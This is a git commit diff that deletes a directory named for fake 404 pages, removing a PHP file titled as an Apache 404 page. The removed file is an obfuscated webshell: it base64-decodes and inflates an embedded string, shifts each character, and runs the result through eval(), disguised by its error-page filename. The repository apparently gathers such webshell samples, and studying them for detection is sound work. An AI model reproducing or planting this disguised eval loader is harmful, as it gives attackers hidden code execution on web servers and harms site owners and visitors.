d27198e306188cf513bdf2353e462e296b994fad
Pings <96440773+BugFor-Pings@users.noreply.github.com>
2023-05-23 18:27:33 +0800

    Delete 伪造404-其他 directory

--- 伪造404-其他/Apache-404页面.php
+++
@@ -1,9 +0,0 @@
-<?php function FSFfXw($ZplwB)
-{ 
-$ZplwB=gzinflate(base64_decode($ZplwB));
- for($i=0;$i<strlen($ZplwB);$i++)
- {
-$ZplwB[$i] = chr(ord($ZplwB[$i])-1);
- }
- return $ZplwB;
- }eval(FSFfXw("VZDbasMwDIYfwE/xY3rRwkg66MUgXkZhGb3YoUvS3ZRS3FhdAqndOU5HGXv22d1ZIBv9/iRLArwxqmoDLlzjWkon4wnujcON6bUS8afIRH2e/lF9xMQ+LWuCpZeeOkcKi/wWr7KD9tw2cDAarm46dGQPZCOxsWnwqVKNa4yWbXs8g8S/L0HWGnsqRLryiiPri7/WTUtw9tjoZziDviNIjSzA16bqd6Rd0GupVQB/O4tEvA8DWH9IpSx1XTrdy8oTxakvSAceDdZFlj9l+ZLPynK+nj0UJV9FHHNjHS7GEPF3MhPxxqhjuGu3a1OeMOaXeJAthnI4GiVs2+sqDAgfvjF82UDiEoN1nj0usqJc8ju+Sn4eLbneas8k7J1dpYx9AA=="));?>
